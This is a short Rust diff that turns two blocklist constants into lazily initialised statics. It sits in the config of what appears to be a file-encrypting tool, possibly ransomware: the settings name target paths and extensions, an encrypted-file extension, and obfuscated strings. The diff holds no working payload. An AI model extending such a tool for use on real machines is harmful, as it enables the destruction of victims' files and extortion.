@@ -21,7 +21,7 @@ pub static ALLOWLIST_PATHS: LazyLock<Vec<PathBuf>> = LazyLock::new(|| {
 });
 
 /// Filesystem paths to avoid [optional]
-pub const BLOCKLIST_PATHS: Option<Vec<PathBuf>> = None;
+pub static BLOCKLIST_PATHS: LazyLock<Option<Vec<PathBuf>>> = LazyLock::new(|| None);
 
 /// File extensions to target
 pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
@@ -37,7 +37,7 @@ pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
 });
 
 /// File extensions to avoid [optional]
-pub const BLOCKLIST_EXTENSIONS: Option<Vec<String>> = None;
+pub static BLOCKLIST_EXTENSIONS: LazyLock<Option<Vec<String>>> = LazyLock::new(|| None);
 
 /// Extension used for encrypted files [required]
 pub static ENCRYPTED_EXTENSION: LazyLock<String> = LazyLock::new(|| lc!("chacha20poly1305"));
